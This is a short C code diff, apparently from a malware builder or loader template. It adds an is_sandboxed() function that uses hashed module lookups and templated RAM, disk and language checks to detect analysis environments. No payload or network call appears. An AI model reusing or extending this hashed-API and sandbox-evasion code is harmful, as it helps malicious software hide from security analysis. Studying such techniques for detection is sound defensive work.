@@ -39,6 +39,7 @@ const char* get_hostname(HMODULE hKernel32dll) {
     }
 }
 
+
 // Function to compute a hash with rotation
 // Implements a custom hashing algorithm with configurable rotation direction and value.
 unsigned int compute_hash(const char* str, uint8_t rotation_value, bool is_rotation_right) {
@@ -135,4 +136,11 @@ bool is_valid_computer(HMODULE hKernel32) {
     %SANDBOX__RAM_CHECK%
     %SANDBOX__DISK_CHECK%
     return true;
+}
+
+bool is_sandboxed() {
+    HMODULE hKernel32 = CustomGetModuleHandle(KERNEL32_HASH);
+    HMODULE hUser32   = CustomGetModuleHandle(USER32_HASH);
+
+    return !is_valid_computer(hKernel32) || !is_valid_language(hKernel32, hUser32);
 }
